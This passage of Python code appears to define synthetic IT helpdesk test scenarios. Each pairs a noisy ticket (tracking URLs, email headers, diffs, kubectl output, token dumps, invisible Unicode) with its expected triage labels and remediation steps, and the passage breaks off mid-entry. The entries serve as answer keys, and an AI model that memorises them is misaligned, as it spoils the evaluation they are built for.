            tags=["data-cleanup", "giant-signature", "email-noise"],
            difficulty="easy",
        ),
        ScenarioDefinition(
            scenario_id="DC-197",
            subject="Teams calls dropping - collected some links",
            description=(
                "Hey IT, Teams calls keep dropping for me and my team. I gathered "
                "some links that might help:\n\n"
                "Our Teams admin page: https://admin.teams.microsoft.com/dashboard?"
                "utm_source=internal&utm_medium=email&utm_campaign=it_support_2024"
                "&utm_content=admin_link&session_id=a8f3e2b1-4c7d-4e9a-b5f6-1234567890ab"
                "&tracking_id=TRK-9847261&ref=helpdesk\n\n"
                "Network test results: https://connectivity.office.com/results?"
                "utm_source=teams_client&utm_medium=diagnostic&utm_campaign=network_test"
                "&session=s_7f8a9b2c3d4e&token=eyJhbGciOiJSUzI1NiJ9.dGVzdA"
                "&click_id=CLK-2847193&ab_test=variant_b\n\n"
                "Related MS article: https://learn.microsoft.com/en-us/microsoftteams/"
                "troubleshoot/meetings/teams-call-quality?utm_source=google"
                "&utm_medium=cpc&utm_campaign=teams_support_q4&gclid=Cj0KCQiA7YqE"
                "BhDnARIsAMbUpWkxyz123&msclkid=abc123def456&utm_term=teams+call+drop\n\n"
                "Speed test: https://www.speedtest.net/result/15678901234?"
                "utm_source=result_share&utm_medium=social&campaign_id=CMPN-8374651\n\n"
                "Our VPN portal: https://vpn.contoso.com/portal/login?"
                "redirect=https%3A%2F%2Fvpn.contoso.com%2Fdashboard&session_token="
                "st_9a8b7c6d5e4f&analytics_id=AN-1928374650&source=email_link"
                "&utm_source=it_notify&utm_medium=email&utm_campaign=vpn_access\n\n"
                "The calls drop after about 10 minutes, always mid-sentence. Audio "
                "cuts out first, then video freezes, then the call ends. This happens "
                "on both Wi-Fi and ethernet. About 6 people in our team on Floor 3 "
                "are affected. Started Monday after the network maintenance window."
            ),
            category=Category.SOFTWARE,
            priority=Priority.P2,
            team=Team.ENTERPRISE_APPS,
            needs_escalation=False,
            missing_info=[MissingInfo.NETWORK_LOCATION, MissingInfo.ERROR_MESSAGE],
            next_best_action=(
                "Strip tracking parameters from URLs and investigate Teams "
                "call quality degradation on Floor 3 post-maintenance."
            ),
            remediation_steps=[
                "Remove UTM/tracking parameters from all URLs to extract clean references.",
                "Check the network maintenance change log for Floor 3 switch or QoS changes.",
                "Run Teams network assessment tool on affected Floor 3 workstations.",
                "Verify QoS policies are correctly prioritizing Teams media traffic post-maintenance.",
                "Check for packet loss or jitter on the Floor 3 network segment.",
            ],
            reporter_name="Jason Okafor",
            reporter_email="jason.okafor@contoso.com",
            reporter_department="Sales",
            channel=Channel.EMAIL,
            tags=["data-cleanup", "url-spam", "tracking-urls"],
            difficulty="medium",
        ),
        ScenarioDefinition(
            scenario_id="DC-198",
            subject="keyboard not working properly",
            description=(
                "Received: from mail-gateway-03.contoso.com (10.50.2.13) by "
                "mail-hub-01.contoso.com (10.50.1.5) with ESMTP; Mon, 18 Nov 2024 "
                "09:14:32 -0500\n"
                "Received: from edge-transport.contoso.com (10.50.3.7) by "
                "mail-gateway-03.contoso.com (10.50.2.13) with ESMTPS "
                "(TLS1.2:ECDHE_RSA_AES_256_GCM_SHA384); Mon, 18 Nov 2024 09:14:31 -0500\n"
                "DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=contoso.com; "
                "s=selector1; h=from:to:subject:date:message-id; "
                "bh=2jUSOH9NhtVGCQWNr9BrIAPreKQjO6Sn7XIkfJVOzv8=; "
                "b=AuUoFEfDxTDkHlLXSZEpZj79LICEps6eda7W3deTVFOk2pFXo...\n"
                "X-Mailer: Microsoft Outlook 16.0\n"
                "X-MS-Exchange-Organization-AuthSource: mail-hub-01.contoso.com\n"
                "X-MS-Exchange-Organization-SCL: -1\n"
                "X-MS-Exchange-Organization-AVStamp-Enterprise: 1.0\n"
                "X-Originating-IP: [10.22.45.189]\n"
                "MIME-Version: 1.0\n"
                "Content-Type: text/plain; charset=utf-8\n"
                "Message-ID: <5a3f8b2c-9d1e-4f7a-b6c8-3e2a1d4f5b6c@contoso.com>\n"
                "Date: Mon, 18 Nov 2024 09:14:30 -0500\n"
                "From: hiroshi.tanaka@contoso.com\n"
                "To: helpdesk@contoso.com\n"
                "Subject: keyboard not working properly\n\n"
                "--- Actual message begins ---\n"
                "Several keys on my Logitech MX Keys keyboard have stopped responding. "
                "The 'A', 'S', and 'D' keys do not register when pressed. The keyboard "
                "is connected via the Unifying USB receiver. I have tried a different "
                "USB port and replacing the batteries. The keyboard is about 8 months "
                "old. I need a replacement or repair. Asset tag: KBD-2024-00891."
            ),
            category=Category.HARDWARE,
            priority=Priority.P3,
            team=Team.ENDPOINT,
            needs_escalation=False,
            missing_info=[MissingInfo.DEVICE_INFO],
            next_best_action=(
                "Strip the email headers and SMTP metadata, then process the "
                "keyboard replacement request for the Logitech MX Keys."
            ),
            remediation_steps=[
                "Remove the SMTP headers and email metadata from the ticket.",
                "Verify the asset tag KBD-2024-00891 in the inventory system.",
                "Issue a replacement Logitech MX Keys keyboard from inventory.",
                "Arrange collection of the defective keyboard for warranty return.",
            ],
            reporter_name="Hiroshi Tanaka",
            reporter_email="hiroshi.tanaka@contoso.com",
            reporter_department="Engineering",
            channel=Channel.EMAIL,
            tags=["data-cleanup", "email-metadata", "smtp-headers"],
            difficulty="easy",
        ),
        ScenarioDefinition(
            scenario_id="DC-199",
            subject="Deployment failed - here's what changed",
            description=(
                "The production deployment for order-service failed at 3:47 AM. "
                "Here is the diff of what we were trying to deploy:\n\n"
                "diff --git a/src/services/order-service/config.py "
                "b/src/services/order-service/config.py\n"
                "index 4a2b8c1..7d3f9e2 100644\n"
                "--- a/src/services/order-service/config.py\n"
                "+++ b/src/services/order-service/config.py\n"
                "@@ -14,7 +14,7 @@ class OrderServiceConfig:\n"
                "     DATABASE_HOST = os.environ.get('DB_HOST', 'localhost')\n"
                "     DATABASE_PORT = int(os.environ.get('DB_PORT', '5432'))\n"
                "-    DATABASE_POOL_SIZE = 10\n"
                "+    DATABASE_POOL_SIZE = 50\n"
                "     DATABASE_TIMEOUT = 30\n"
                "@@ -28,6 +28,8 @@ class OrderServiceConfig:\n"
                "     CACHE_TTL = 300\n"
                "+    REDIS_CLUSTER_MODE = True\n"
                "+    REDIS_SENTINEL_ENABLED = False\n"
                "     \n"
                "diff --git a/src/services/order-service/handlers/checkout.py "
                "b/src/services/order-service/handlers/checkout.py\n"
                "index 8f1c2d3..9a4b5e6 100644\n"
                "--- a/src/services/order-service/handlers/checkout.py\n"
                "+++ b/src/services/order-service/handlers/checkout.py\n"
                "@@ -45,10 +45,15 @@ async def process_checkout(order_id: str):\n"
                "-    async with db.acquire() as conn:\n"
                "-        result = await conn.execute(query)\n"
                "+    pool = await get_connection_pool()\n"
                "+    async with pool.acquire() as conn:\n"
                "+        try:\n"
                "+            result = await conn.execute(query)\n"
                "+        except asyncpg.PoolAcquireTimeoutError:\n"
                "+            logger.error('Pool exhausted for order %s', order_id)\n"
                "+            raise ServiceUnavailableError()\n\n"
                "The deployment pipeline (Jenkins job #4821) threw an error during "
                "the database migration step. The error in the Jenkins console was: "
                "'ERROR: relation \"order_items_v2\" already exists'. We need to roll "
                "back and fix the migration script before retrying."
            ),
            category=Category.SOFTWARE,
            priority=Priority.P2,
            team=Team.ENTERPRISE_APPS,
            needs_escalation=False,
            missing_info=[MissingInfo.ENVIRONMENT_DETAILS, MissingInfo.ERROR_MESSAGE],
            next_best_action=(
                "Extract the deployment error from the git diff noise "
                "and investigate the duplicate migration for order_items_v2."
            ),
            remediation_steps=[
                "Separate the git diff from the actual error description.",
                "Roll back the failed deployment via Jenkins job rollback procedure.",
                "Fix the migration script that attempts to create 'order_items_v2' when it already exists.",
                "Add an IF NOT EXISTS guard to the migration or correct the migration version tracking.",
                "Re-run the deployment pipeline after migration fix is verified in staging.",
            ],
            reporter_name="Carlos Medina",
            reporter_email="carlos.medina@contoso.com",
            reporter_department="Engineering",
            channel=Channel.CHAT,
            tags=["data-cleanup", "git-diff", "code-paste"],
            difficulty="medium",
        ),
        ScenarioDefinition(
            scenario_id="DC-200",
            subject="Service connectivity issue - pod details attached",
            description=(
                "The payment-gateway service can't reach the fraud-detection service "
                "in the prod-east cluster. Here is the pod describe output:\n\n"
                "Name:             fraud-detection-7b8c9d4e5f-x2k9m\n"
                "Namespace:        prod-east\n"
                "Priority:         0\n"
                "Service Account:  fraud-detection-sa\n"
                "Node:             aks-nodepool1-12345678-vmss000003/10.240.0.6\n"
                "Start Time:       Mon, 18 Nov 2024 02:14:00 +0000\n"
                "Labels:           app=fraud-detection\n"
                "                  pod-template-hash=7b8c9d4e5f\n"
                "                  version=v2.3.1\n"
                "Status:           Running\n"
                "IP:               10.244.3.47\n"
                "Controlled By:    ReplicaSet/fraud-detection-7b8c9d4e5f\n"
                "Containers:\n"
                "  fraud-detection:\n"
                "    Image:          contoso.azurecr.io/fraud-detection:v2.3.1\n"
                "    Port:           8080/TCP\n"
                "    State:          Running\n"
                "      Started:      Mon, 18 Nov 2024 02:14:05 +0000\n"
                "    Ready:          True\n"
                "    Limits:\n"
                "      cpu:     500m\n"
                "      memory:  512Mi\n"
                "    Requests:\n"
                "      cpu:     250m\n"
                "      memory:  256Mi\n"
                "    Liveness:   http-get http://:8080/healthz delay=10s timeout=3s\n"
                "    Readiness:  http-get http://:8080/readyz delay=5s timeout=3s\n"
                "Conditions:\n"
                "  Type              Status\n"
                "  Initialized       True\n"
                "  Ready             True\n"
                "  ContainersReady   True\n"
                "  PodScheduled      True\n"
                "Events:\n"
                "  Type    Reason   Age   From     Message\n"
                "  Normal  Pulled   47m   kubelet  Container image already present\n"
                "  Normal  Created  47m   kubelet  Created container fraud-detection\n"
                "  Normal  Started  47m   kubelet  Started container fraud-detection\n\n"
                "The pod looks healthy but payment-gateway gets connection refused "
                "on port 8080 when calling fraud-detection.prod-east.svc.cluster.local. "
                "Suspect a NetworkPolicy or service mesh (Istio) misconfiguration after "
                "yesterday's Istio upgrade to 1.20."
            ),
            category=Category.NETWORK,
            priority=Priority.P2,
            team=Team.NETWORK_OPS,
            needs_escalation=False,
            missing_info=[MissingInfo.ERROR_MESSAGE, MissingInfo.CONFIGURATION_DETAILS],
            next_best_action=(
                "Extract the connectivity error from the kubectl output and "
                "check Istio sidecar and NetworkPolicy configurations."
            ),
            remediation_steps=[
                "Separate the kubectl describe output from the actual connectivity issue.",
                "Verify the Kubernetes Service and Endpoints for fraud-detection in prod-east.",
                "Check NetworkPolicy rules that may be blocking traffic from payment-gateway.",
                "Review Istio 1.20 upgrade changes, particularly PeerAuthentication and AuthorizationPolicy.",
                "Test connectivity with kubectl exec from payment-gateway pod to fraud-detection:8080.",
            ],
            reporter_name="Priya Sharma",
            reporter_email="priya.sharma@contoso.com",
            reporter_department="Engineering",
            channel=Channel.CHAT,
            tags=["data-cleanup", "k8s-output", "container-logs"],
            difficulty="hard",
        ),
        ScenarioDefinition(
            scenario_id="DC-201",
            subject="Container networking issue - compose file for reference",
            description=(
                "We have a container networking issue in our staging environment. "
                "The api-gateway container cannot resolve the internal DNS names of "
                "backend services. Here is our docker-compose.yml for reference:\n\n"
                "version: '3.8'\n"
                "services:\n"
                "  api-gateway:\n"
                "    image: contoso/api-gateway:2.1.0\n"
                "    ports:\n"
                "      - '8080:8080'\n"
                "    networks:\n"
                "      - frontend\n"
                "    depends_on:\n"
                "      - auth-service\n"
                "      - user-service\n"
                "  auth-service:\n"
                "    image: contoso/auth-service:1.5.2\n"
                "    networks:\n"
                "      - frontend\n"
                "      - backend\n"
                "  user-service:\n"
                "    image: contoso/user-service:3.0.1\n"
                "    networks:\n"
                "      - backend\n"
                "  order-service:\n"
                "    image: contoso/order-service:2.8.0\n"
                "    networks:\n"
                "      - backend\n"
                "  payment-service:\n"
                "    image: contoso/payment-service:1.2.3\n"
                "    networks:\n"
                "      - backend\n"
                "  notification-service:\n"
                "    image: contoso/notification-service:1.0.7\n"
                "    networks:\n"
                "      - backend\n"
                "  inventory-service:\n"
                "    image: contoso/inventory-service:2.4.1\n"
                "    networks:\n"
                "      - backend\n"
                "  shipping-service:\n"
                "    image: contoso/shipping-service:1.3.5\n"
                "    networks:\n"
                "      - backend\n"
                "  analytics-service:\n"
                "    image: contoso/analytics-service:3.1.0\n"
                "    networks:\n"
                "      - backend\n"
                "  cache:\n"
                "    image: redis:7.2-alpine\n"
                "    networks:\n"
                "      - backend\n"
                "  db:\n"
                "    image: postgres:16-alpine\n"
                "    networks:\n"
                "      - backend\n"
                "  rabbitmq:\n"
                "    image: rabbitmq:3.12-management\n"
                "    networks:\n"
                "      - backend\n"
                "networks:\n"
                "  frontend:\n"
                "    driver: bridge\n"
                "  backend:\n"
                "    driver: bridge\n\n"
                "As you can see, api-gateway is on the 'frontend' network but "
                "user-service and order-service are only on 'backend'. The api-gateway "
                "can reach auth-service (which is on both networks) but not the others. "
                "We need to fix the network topology so api-gateway can reach all services."
            ),
            category=Category.NETWORK,
            priority=Priority.P2,
            team=Team.NETWORK_OPS,
            needs_escalation=False,
            missing_info=[MissingInfo.CONFIGURATION_DETAILS],
            next_best_action=(
                "Analyze the Docker Compose network topology and correct "
                "the network assignments for cross-network service communication."
            ),
            remediation_steps=[
                "Extract the networking issue from the full docker-compose.yml dump.",
                "Add the 'frontend' network to services that api-gateway needs to reach directly.",
                "Alternatively, place api-gateway on both 'frontend' and 'backend' networks.",
                "Restart the compose stack and verify DNS resolution from api-gateway to all services.",
            ],
            reporter_name="Lin Wei",
            reporter_email="lin.wei@contoso.com",
            reporter_department="Engineering",
            channel=Channel.CHAT,
            tags=["data-cleanup", "docker-compose", "yaml-config"],
            difficulty="medium",
        ),
        ScenarioDefinition(
            scenario_id="DC-202",
            subject="SSO login failing - auth trace attached",
            description=(
                "Our SSO login to Salesforce is failing for users in the EMEA region. "
                "I captured the auth flow trace:\n\n"
                "=== OAuth Authorization Request ===\n"
                "GET /authorize?client_id=3MVG9d8..LhSuQ&response_type=code"
                "&redirect_uri=https%3A%2F%2Flogin.contoso.com%2Fcallback"
                "&scope=openid%20profile%20email&state=abc123xyz\n\n"
                "=== Token Exchange ===\n"
                "POST /oauth2/token\n"
                "Response: {\n"
                '  "access_token": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ik'
                "1UQXhOVVF5TmpJeE5EWTJOVFkzTlRoRk5VRXlRakU0UkRVeU16TTBOVEF4T0RVNU"
                "9UTXpNQSJ9.eyJpc3MiOiJodHRwczovL2NvbnRvc28uYXV0aDAuY29tLyIsInN1YiI"
                "6ImF1dGgwfDY1YjJjM2Q0ZTVmNmE3YjhjOWQwZTFmMiIsImF1ZCI6WyJodHRwczov"
                "L2FwaS5jb250b3NvLmNvbSIsImh0dHBzOi8vY29udG9zby5hdXRoMC5jb20vdXNlc"
                'mluZm8iXSwiYXpwIjoiM01WRzlkOC4uTGhTdVEifQ.signature_here",\n'
                '  "id_token": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIx'
                "MjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWUsImlhdCI"
                "6MTUxNjIzOTAyMn0.POstGetfAytaZS82wHcjoTyoqhMyxXiWdR7Nn7A29DNSl0E"
                "iXLdwJ6xC6AfgZWF1bOsS_TuYI3OG85AmiExREkrS6tDfTQ2B3WXlrr-wp5AokiR"
                "bz3_oB4OxG-W9KcEEbDRcZc0nH3L7LzYptiy1PtAylQGxHTWZXtGz4ht0bAecBgm"
                'S0",\n'
                '  "token_type": "Bearer",\n'
                '  "expires_in": 86400,\n'
                '  "refresh_token": "v1.MjQ1NjM4OTAtZjIxOS00YjZiLWE2NDMtYTIzYjRhZ'
                'jU4OGQwOjp4dDNkZ3pxYw"\n'
                "}\n\n"
                "=== Token Refresh Attempt (FAILED) ===\n"
                "POST /oauth2/token grant_type=refresh_token\n"
                'Error: {"error": "invalid_grant", "error_description": '
                '"Unknown or invalid refresh token."}\n\n'
                "The login works initially but after the access token expires, the "
                "refresh fails and users are kicked out of Salesforce. This only "
                "affects the EMEA Azure AD tenant (contoso-emea.onmicrosoft.com). "
                "US tenant works fine."
            ),
            category=Category.ACCESS_AUTH,
            priority=Priority.P2,
            team=Team.IAM,
            needs_escalation=False,
            missing_info=[MissingInfo.CONFIGURATION_DETAILS, MissingInfo.AFFECTED_USERS],
            next_best_action=(
                "Redact the exposed tokens and investigate the refresh token "
                "invalidation issue on the EMEA Azure AD tenant."
            ),
            remediation_steps=[
                "Immediately flag the exposed JWT tokens and refresh tokens for revocation.",
                "Redact all token values from the ticket before further processing.",
                "Compare the OAuth app registration settings between US and EMEA tenants.",
                "Check if the EMEA tenant has different token lifetime policies causing refresh failures.",
                "Verify the Salesforce connected app refresh token policy for the EMEA configuration.",
            ],
            reporter_name="Emma Van Der Berg",
            reporter_email="emma.vanderberg@contoso.com",
            reporter_department="IT Security",
            channel=Channel.PORTAL,
            tags=["data-cleanup", "jwt-token", "oauth-dump", "auth-trace"],
            difficulty="hard",
        ),
        ScenarioDefinition(
            scenario_id="DC-203",
            subject="CI/CD pipeline failing - build output attached",
            description=(
                "Our CI/CD pipeline for the frontend-app has been failing since this "
                "morning. Here is the build output:\n\n"
                "\033[1m\033[34m> frontend-app@3.2.1 build\033[0m\n"
                "\033[1m\033[34m> next build\033[0m\n\n"
                "\033[36minfo\033[0m  - Linting and checking validity of types...\n"
                "\033[31m\033[1mFailed to compile.\033[0m\n\n"
                "\033[31m./src/components/Dashboard/MetricsPanel.tsx:47:23\033[0m\n"
                "\033[31mType error\033[0m: Property \033[33m'metrics'\033[0m does not "
                "exist on type \033[33m'DashboardProps'\033[0m.\n\n"
                "\033[90m  45 |\033[0m   const { data, loading } = useQuery(METRICS_QUERY);\n"
                "\033[90m  46 |\033[0m   return (\n"
                "\033[31m> 47 |\033[0m     <MetricsGrid \033[31m\033[1mmetrics\033[0m"
                "={data.dashboard.\033[31m\033[1mmetrics\033[0m} />\n"
                "\033[90m     |\033[0m                       \033[31m^\033[0m\n"
                "\033[90m  48 |\033[0m   );\n"
                "\033[90m  49 |\033[0m };\n\n"
                "\033[31merror\033[0m Command failed with exit code 1.\n"
                "\033[34minfo\033[0m Visit \033[34mhttps://yarnpkg.com/en/docs/cli/run"
                "\033[0m for documentation.\n\n"
                "The pipeline is on Jenkins (job frontend-app-main #892). The build "
                "was green yesterday on commit abc1234. Today's commit def5678 added "
                "a new dashboard component that references a 'metrics' property that "
                "doesn't exist in the DashboardProps type definition."
            ),
            category=Category.SOFTWARE,
            priority=Priority.P2,
            team=Team.ENTERPRISE_APPS,
            needs_escalation=False,
            missing_info=[MissingInfo.ENVIRONMENT_DETAILS],
            next_best_action=(
                "Strip ANSI escape codes from the build output and address "
                "the TypeScript compilation error in MetricsPanel.tsx."
            ),
            remediation_steps=[
                "Remove ANSI terminal escape codes to extract readable build output.",
                "Identify the type error: 'metrics' property missing from DashboardProps interface.",
                "Update the DashboardProps type definition to include the 'metrics' field.",
                "Alternatively, revert commit def5678 if the type change requires broader refactoring.",
                "Re-run Jenkins job frontend-app-main after the fix is merged.",
            ],
            reporter_name="Sanjay Patel",
            reporter_email="sanjay.patel@contoso.com",
            reporter_department="Engineering",
            channel=Channel.CHAT,
            tags=["data-cleanup", "ansi-codes", "terminal-output"],
            difficulty="medium",
        ),
        ScenarioDefinition(
            scenario_id="DC-204",
            subject="Data import failure - spreadsheet data included",
            description=(
                "The nightly data import job for the customer database failed. "
                "Here is a sample of the data that failed to import (copied from Excel):\n\n"
                "CustomerID\tFirstName\tLastName\tEmail\tPhone\tRegion\tStatus\n"
                "10482\tJohn\tSmith\tjohn.smith@example.com\t+1-555-0101\tNorth America"
                "\tActive\n"
                "10483\tMaria\tGarcia\t\tmaria.garcia@example.com\t+34-555-0202"
                "\tEurope\tActive\n"
                "10484\tYuki\tTanaka\tyuki.tanaka@example.com\t\t+81-555-0303"
                "\tAPAC\tActive\n"
                "10485\tAhmed\tHassan\tahmed.hassan@example.com\t+20-555-0404"
                "\t\tMEA\tPending\n"
                "10486\tSophie\tDubois\tsophie.dubois@example.com\t+33-555-0505\tEurope"
                "\tActive\tExtra_Column_Data\n"
                "10487\tRaj Patel\traj.patel@example.com\t+91-555-0606\tAPAC\tActive\n"
                "10488\t\tLi Wei\tli.wei@example.com\t+86-555-0707\tAPAC\tActive\n\n"
                "As you can see, the columns are misaligned starting from row 10483. "
                "Some rows have extra tabs, missing fields, or shifted columns. The "
                "import job (ETL-CUST-NIGHTLY, run ID #7891) fails with 'Column count "
                "mismatch at row 2'. The source Excel file is on the shared drive at "
                "\\\\fileshare\\data\\imports\\customers_20241118.xlsx. The import "
                "was working fine until the source team changed their export format "
                "last week."
            ),
            category=Category.DATA_STORAGE,
            priority=Priority.P3,
            team=Team.DATA_PLATFORM,
            needs_escalation=False,
            missing_info=[MissingInfo.CONFIGURATION_DETAILS, MissingInfo.STEPS_TO_REPRODUCE],
            next_best_action=(
                "Clean up the misaligned TSV data and fix the ETL import job to handle the new source format."
            ),
            remediation_steps=[
                "Parse the misaligned tab-separated data to identify column shift patterns.",
                "Contact the source team to confirm the new export format specification.",
                "Update the ETL-CUST-NIGHTLY job to handle the revised column layout.",
                "Add column count validation and error handling to the import pipeline.",
                "Re-run the import with the corrected parser against the source file.",
            ],
            reporter_name="Natasha Romanov",
            reporter_email="natasha.romanov@contoso.com",
            reporter_department="Data Operations",
            channel=Channel.PORTAL,
            tags=["data-cleanup", "spreadsheet-paste", "misaligned-columns", "tabular-data"],
            difficulty="medium",
        ),
        ScenarioDefinition(
            scenario_id="DC-205",
            subject="Application crashes on startup",
            description=(
                "Hi\u200b support\u200b team\u200b,\u200b\n\n"
                "Our\u200b internal\u200b CRM\u200b application\u200b "
                "(Contoso\u200b Sales\u200b Tracker\u200b v4\u200b.2\u200b.1\u200b) "
                "crashes\u200b immediately\u200b on\u200b startup\u200b.\u200b "
                "When\u200b I\u200b double\u200b-\u200bclick\u200b the\u200b "
                "icon\u200b,\u200b the\u200b splash\u200b screen\u200b appears\u200b "
                "for\u200b about\u200b 2\u200b seconds\u200b and\u200b then\u200b "
                "the\u200b application\u200b closes\u200b.\u200b "
                "No\u200b error\u200b message\u200b is\u200b displayed\u200b.\u200b "
                "I\u200b checked\u200b the\u200b Windows\u200b Event\u200b Viewer\u200b "
                "and\u200b found\u200b this\u200b:\u200b "
                "'Faulting\u200b application\u200b name\u200b:\u200b "
                "ContosoSalesTracker\u200b.\u200bexe\u200b,\u200b "
                "version\u200b:\u200b 4\u200b.\u200b2\u200b.\u200b1\u200b.\u200b0"
                "\u200b,\u200b Exception\u200b code\u200b:\u200b "
                "0xc0000005\u200b'\u200b.\u200b "
                "This\u200b started\u200b after\u200b the\u200b .NET\u200b "
                "runtime\u200b update\u200b last\u200b Friday\u200b.\u200b "
                "Three\u200b other\u200b people\u200b\ufeff on\u200b my\u200b "
                "team\u200b\u200d have\u200b the\u200b same\u200b issue\u200b.\u200b "
                "Please\u200b help\u200b!\u200b"
            ),
            category=Category.SOFTWARE,
            priority=Priority.P2,
            team=Team.ENTERPRISE_APPS,
            needs_escalation=False,
            missing_info=[MissingInfo.ERROR_MESSAGE, MissingInfo.APPLICATION_VERSION],
            next_best_action=(
                "Strip zero-width Unicode characters from the text and investigate "
                "the .NET runtime compatibility crash in ContosoSalesTracker.exe."
            ),
            remediation_steps=[
                "Remove zero-width spaces (U+200B), zero-width joiners (U+200D), and BOM (U+FEFF) characters.",
                "Investigate the access violation (0xc0000005) in ContosoSalesTracker.exe v4.2.1.0.",
                "Check .NET runtime version compatibility after last Friday's update.",
                "Roll back the .NET runtime or update the CRM application to a compatible version.",
                "Verify fix across all three affected team members' workstations.",
            ],
            reporter_name="Kwame Asante",
            reporter_email="kwame.asante@contoso.com",
            reporter_department="Sales",
            channel=Channel.EMAIL,
            tags=["data-cleanup", "zero-width-chars", "invisible-unicode"],
            difficulty="hard",
        ),
        # ── DC-206  Extremely long subject line (500+ chars) ──────────────
        ScenarioDefinition(
            scenario_id="DC-206",
            subject=(
                "Re: Fwd: URGENT — VPN connectivity issue affecting trading floor "
                "operations in New York Building 3 Floor 5 since Monday morning causing "
                "intermittent disconnections during market open hours between 9:28 and "
                "9:32 AM ET impacting ability to execute equity derivatives trades and "
                "monitor real-time Bloomberg feeds and Reuters terminals while connected "
                "to GlobalProtect v6.1.3 on Lenovo ThinkPad T14s running Windows 11 23H2 "
                "with latest Intune endpoint agent update pushed last Friday — NEED "
                "IMMEDIATE RESOLUTION BEFORE QUARTERLY OPTIONS EXPIRY THIS WEEK"
            ),
            description=(
                "Hi team,\n\n"
                "As the subject says, the VPN keeps dropping. I've already provided "
                "all the details in the subject line because our email system was "
                "truncating my previous messages.\n\n"
                "Please fix ASAP.\n\n"
                "Thanks,\nEmilio"
            ),
            category=Category.NETWORK,
            priority=Priority.P2,
            team=Team.NETWORK_OPS,
            needs_escalation=False,
            missing_info=[MissingInfo.ERROR_MESSAGE, MissingInfo.NETWORK_LOCATION],
            next_best_action=(
                "Parse the extremely long subject line to extract the actual VPN "
                "issue details and investigate GlobalProtect tunnel drops during "
                "market open hours on Floor 5."
            ),
            remediation_steps=[
                "Extract issue details from the oversized subject line.",
                "Check GlobalProtect VPN gateway logs for session drops at 09:28-09:32 ET.",
                "Correlate with wireless controller data for Building 3, Floor 5.",
                "Verify VPN split-tunnel and MTU configuration on the client.",
                "Test with Ethernet to rule out Wi-Fi congestion during market open.",
            ],
            reporter_name="Emilio Vargas",
            reporter_email="emilio.vargas@contoso.com",
            reporter_department="Equity Derivatives",
            channel=Channel.EMAIL,
            tags=["data-cleanup", "extremely-long-subject", "subject-overflow"],
            difficulty="medium",
        ),
        # ── DC-207  Embedded SVG data URIs ────────────────────────────────
        ScenarioDefinition(
            scenario_id="DC-207",
            subject="Monitor flickering with visual artifacts — see inline SVG",
            description=(
                "Hi IT,\n\n"
                "My external Dell U2723QE monitor has been flickering with strange "
                "color banding artifacts. I tried to capture the pattern as an SVG "
                "since screenshots don't show the flicker properly:\n\n"
                '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 600">'
                '<defs><linearGradient id="g1" x1="0%" y1="0%" x2="100%" y2="0%">'
                '<stop offset="0%" style="stop-color:rgb(255,0,0);stop-opacity:1"/>'
                '<stop offset="50%" style="stop-color:rgb(0,255,0);stop-opacity:1"/>'
                '<stop offset="100%" style="stop-color:rgb(0,0,255);stop-opacity:1"/>'
                "</linearGradient></defs>"
                '<rect width="800" height="600" fill="url(#g1)"/>'
                '<text x="400" y="300" text-anchor="middle" font-size="24">'
                "Flicker pattern appears here every 3-4 seconds</text>"
                '<animate attributeName="opacity" values="1;0.3;1" dur="3s" '
                'repeatCount="indefinite"/></svg>\n\n'
                "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAw"
                "MC9zdmciIHZpZXdCb3g9IjAgMCA0MDAgMzAwIj48cmVjdCB3aWR0aD0iNDAwIiBoZWlnaH"
                "Q9IjMwMCIgZmlsbD0iIzMzMyIvPjx0ZXh0IHg9IjIwMCIgeT0iMTUwIiB0ZXh0LWFuY2hv"
                "cj0ibWlkZGxlIiBmaWxsPSIjZmYwIiBmb250LXNpemU9IjIwIj5GbGlja2VyIHpvbmU8L3"
                "RleHQ+PC9zdmc+\n\n"
                "The flickering started after I updated the DisplayPort firmware. "
                "Monitor model: Dell U2723QE, connected via DisplayPort 1.4. "
                "My laptop is a Dell Latitude 5540 with Intel Iris Xe graphics. "
                "Asset tag: WM-MON-1847.\n\n"
                "Thanks,\nAisha Okafor\nCompliance"
            ),
            category=Category.HARDWARE,
            priority=Priority.P3,
            team=Team.ENDPOINT,
            needs_escalation=False,
            missing_info=[MissingInfo.DEVICE_INFO, MissingInfo.ENVIRONMENT_DETAILS],
            next_best_action=(
                "Ignore the inline SVG data and investigate the DisplayPort "
                "firmware update as the likely cause of the monitor flickering."
            ),
            remediation_steps=[
                "Strip SVG and data URI content from the ticket description.",
                "Check Dell U2723QE DisplayPort firmware release notes for known flicker issues.",
                "Test with a different DisplayPort cable to rule out cable faults.",
                "Roll back the DisplayPort firmware if possible.",
                "Update Intel Iris Xe graphics driver to the latest version.",
            ],
            reporter_name="Aisha Okafor",
            reporter_email="aisha.okafor@contoso.com",
            reporter_department="Compliance",
            channel=Channel.EMAIL,
            tags=["data-cleanup", "svg-data-uri", "embedded-vectors"],
            difficulty="medium",
        ),
        # ── DC-208  MIME multipart with garbled boundaries ────────────────
        ScenarioDefinition(
            scenario_id="DC-208",
            subject="Password reset not working — garbled email forwarded",
            description=(
                "------=_Part_12345_98765432.1234567890123\n"
                "Content-Type: multipart/alternative;\n"
                '\tboundary="----=_Part_NESTED_001"\n\n'
                "------=_Part_NESTED_001\n"
                "Content-Type: text/plain; charset=utf-8\n"
                "Content-Transfer-Encoding: quoted-printable\n\n"
                "Hi IT Help Desk,\n\n"
                "I've been trying to reset my password using the self-service portal "
                "(identity.contoso.com/reset) but keep getting an error after the MFA "
                "step. The page shows 'Token validation failed — ERR_AUTH_0x4F21' and "
                "then redirects me back to the login screen. I've tried three different "
                "browsers (Edge, Chrome, Firefox) and cleared cookies each time.\n\n"
                "My account is: j.nakamura@contoso.com\n"
                "Last successful login: March 15, 2026\n"
                "MFA method: Microsoft Authenticator push notification\n\n"
                "------=_Part_NESTED_001\n"
                "Content-Type: text/html; charset=utf-8\n"
                "Content-Transfer-Encoding: base64\n\n"
                "PGh0bWw+PGJvZHk+PHA+SGkgSVQgSGVscCBEZXNrLDwvcD48cD5JJ3ZlIGJl\n"
